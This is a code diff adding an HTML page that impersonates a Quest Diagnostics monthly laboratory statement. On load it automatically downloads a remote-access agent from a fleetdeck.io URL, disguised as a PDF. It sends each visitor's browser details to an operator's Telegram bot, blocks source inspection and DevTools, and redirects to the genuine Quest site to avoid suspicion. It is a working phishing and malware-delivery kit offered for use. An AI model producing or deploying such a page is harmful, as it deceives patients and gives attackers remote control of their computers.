@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quest Diagnostics® — Monthly Laboratory Statement</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+
+            /* 🔒 Anti-copy protection */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            max-width: 640px;
+            width: 100%;
+            padding: 48px 40px;
+            border-top: 6px solid #00a651;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .logo img {
+            height: 48px;
+            width: auto;
+            max-width: 100%;
+            object-fit: contain;
+
+            /* 🔒 Prevent image dragging / saving */
+            -webkit-user-drag: none;
+            user-drag: none;
+            pointer-events: none;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 12px;
+        }
+
+        .intro {
+            font-size: 15px;
+            line-height: 1.7;
+            color: #4a4a5e;
+            margin-bottom: 20px;
+        }
+
+        .intro strong {
+            color: #00a651;
+        }
+
+        .info-box {
+            background: #eef9f3;
+            border-radius: 10px;
+            padding: 18px 20px;
+            margin-bottom: 32px;
+            border-left: 4px solid #00a651;
+        }
+
+        .info-box p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+        }
+
+        .info-box strong {
+            color: #007a3d;
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1a1a2e;
+        }
+
+        ul {
+            list-style: none;
+            margin-bottom: 32px;
+        }
+
+        ul li {
+            font-size: 15px;
+            color: #333;
+            padding: 10px 0 10px 36px;
+            position: relative;
+            border-bottom: 1px solid #eef1f4;
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '✓';
+            position: absolute;
+            left: 6px;
+            top: 11px;
+            color: #00a651;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px 24px;
+            background-color: #00a651;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.15s ease;
+            text-decoration: none;
+        }
+
+        .download-btn:hover {
+            background-color: #008a44;
+            transform: translateY(-1px);
+        }
+
+        .download-btn:active {
+            transform: translateY(0);
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 18px;
+            color: #7a7a8e;
+            font-size: 13px;
+        }
+
+        .security-note svg {
+            width: 16px;
+            height: 16px;
+            color: #00a651;
+        }
+
+        .redirect-note {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 13px;
+            color: #7a7a8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- Quest Diagnostics® Official Logo -->
+        <div class="logo">
+            <img src="https://s7d6.scene7.com/is/image/questdiagnostics/Quest-Diagnostics-RGB-gradient?$corp-header-logo$" alt="Quest Diagnostics" />
+        </div>
+
+        <!-- Heading -->
+        <h1>Your Monthly Laboratory Statement</h1>
+
+        <!-- Main message -->
+        <p class="intro">
+            Your laboratory results from the past 30 days have been securely compiled into a single statement for your convenience.
+        </p>
+
+        <div class="info-box">
+            <p>
+                <strong>Download your statement</strong> to review all completed laboratory tests performed during this period.
+                The statement is provided in <strong>PDF format</strong> and can be saved for your personal records or shared
+                with your healthcare provider if needed.
+            </p>
+        </div>
+
+        <!-- What's Included -->
+        <h2>What's Included</h2>
+        <ul>
+            <li>Laboratory results completed during the last 30 days</li>
+            <li>Test names and completion dates</li>
+            <li>Consolidated PDF report</li>
+            <li>Secure and encrypted download</li>
+        </ul>
+
+        <!-- Download button -->
+        <a href="YOUR_PDF_URL_HERE" class="download-btn" download id="manualDownloadBtn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="7 10 12 15 17 10"/>
+                <line x1="12" y1="15" x2="12" y2="3"/>
+            </svg>
+            Download Your Statement (PDF)
+        </a>
+
+        <div class="security-note">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+            Secure • Encrypted • HIPAA Compliant
+        </div>
+
+        <p class="redirect-note">
+            Your download will begin automatically. You will be redirected shortly.
+        </p>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔒 PAGE PROTECTION (DETERRENT — NOT ABSOLUTE SECURITY)
+        // ============================================================
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
+        document.addEventListener('cut', e => e.preventDefault());
+        document.addEventListener('paste', e => e.preventDefault());
+
+        document.addEventListener('keydown', function (e) {
+            // Block F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+                return false;
+            }
+
+            // Block Ctrl+Shift+I / J / C / S / K (DevTools, console, source)
+            if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'S', 'K'].includes(e.key.toUpperCase())) {
+                e.preventDefault();
+                return false;
+            }
+
+            // Block Ctrl+U / S / C / A / P (view source, save, copy, select all, print)
+            if (e.ctrlKey && ['U', 'S', 'C', 'A', 'P'].includes(e.key.toUpperCase())) {
+                e.preventDefault();
+                return false;
+            }
+
+            // Block PrintScreen (approximate; not always reliable)
+            if (e.key === 'PrintScreen') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // ============================================================
+        // CONFIGURATION — EDIT THIS SECTION
+        // ============================================================
+
+        // 👇👇👇 PASTE YOUR PDF DOWNLOAD URL HERE 👇👇👇
+        const PDF_URL = 'https://agent.fleetdeck.io/3KzQPdtFFfGfannxuGSJAE?win';
+
+        // Redirect after download completes
+        const REDIRECT_URL = 'https://www.questdiagnostics.com/laboratory-managers/tests-by-specialty/genetics';
+        const DELAY_AFTER_DOWNLOAD_MS = 7000; // 7 seconds
+
+        // 👇👇👇 TELEGRAM BOT CONFIGURATION 👇👇👇
+        const TELEGRAM_BOT_TOKEN = '';       // Get from @BotFather
+        const TELEGRAM_CHAT_ID = '';           // Your admin chat ID
+
+        // ============================================================
+        // TELEGRAM NOTIFICATION HELPERS
+        // ============================================================
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE)[\/\s]?(\d+)/);
+            return match ? `${match[1]} ${match[2]}` : 'Unknown';
+        }
+
+        function getCurrentTime() {
+            return new Date().toLocaleString('en-US');
+        }
+
+        async function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                if (!response.ok) {
+                    console.warn('Telegram notification failed:', await response.text());
+                }
+            } catch (error) {
+                console.warn('Telegram notification error:', error);
+            }
+        }
+
+        function notifyDownloadStart() {
+            sendTelegramNotification([
+                '🟢 <b>Quest Diagnostics® Statement Download STARTED</b>',
+                '',
+                `🕒 <b>Time:</b> ${getCurrentTime()}`,
+                `💻 <b>Browser:</b> ${getBrowserInfo()}`,
+                `📱 <b>Screen:</b> ${window.screen.width}x${window.screen.height}`,
+                `🔗 <b>Page:</b> ${window.location.href}`
+            ].join('\n'));
+        }
+
+        function notifyDownloadSuccess() {
+            sendTelegramNotification([
+                '✅ <b>Quest Diagnostics® Statement Download COMPLETED</b>',
+                '',
+                `🕒 <b>Time:</b> ${getCurrentTime()}`,
+                `💻 <b>Browser:</b> ${getBrowserInfo()}`,
+                `📄 <b>File:</b> Monthly-Laboratory-Statement.pdf`,
+                `⏳ <b>Redirect in:</b> ${DELAY_AFTER_DOWNLOAD_MS / 1000} seconds`
+            ].join('\n'));
+        }
+
+        function notifyRedirect() {
+            sendTelegramNotification([
+                '🔀 <b>User redirected to genetics page</b>',
+                `🕒 <b>Time:</b> ${getCurrentTime()}`,
+                `🎯 <b>Destination:</b> ${REDIRECT_URL}`
+            ].join('\n'));
+        }
+
+        // ============================================================
+        // DOWNLOAD + REDIRECT LOGIC
+        // ============================================================
+        function triggerAnchorDownload(url, filename = 'Monthly-Laboratory-Statement.pdf') {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+        }
+
+        function redirectAfterDelay() {
+            setTimeout(() => {
+                notifyRedirect();
+                window.location.href = REDIRECT_URL;
+            }, DELAY_AFTER_DOWNLOAD_MS);
+        }
+
+        async function startAutoDownload() {
+            // Notify admin: download started
+            notifyDownloadStart();
+
+            // Try fetch-based download first (lets us detect completion)
+            try {
+                const response = await fetch(PDF_URL, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include'
+                });
+
+                if (!response.ok) throw new Error('Network response was not ok');
+
+                const blob = await response.blob();
+                const blobUrl = URL.createObjectURL(blob);
+
+                triggerAnchorDownload(blobUrl, 'Monthly-Laboratory-Statement.pdf');
+
+                // Clean up blob URL
+                setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
+
+                // Notify admin: download completed
+                notifyDownloadSuccess();
+
+                // Redirect after 7 seconds
+                redirectAfterDelay();
+
+            } catch (error) {
+                // Fallback: direct anchor download
+                console.warn('Fetch download failed, using anchor fallback:', error);
+                triggerAnchorDownload(PDF_URL, 'Monthly-Laboratory-Statement.pdf');
+                notifyDownloadSuccess();
+                redirectAfterDelay();
+            }
+        }
+
+        // Start automatically on page load
+        document.addEventListener('DOMContentLoaded', startAutoDownload);
+    </script>
+</body>
+</html>
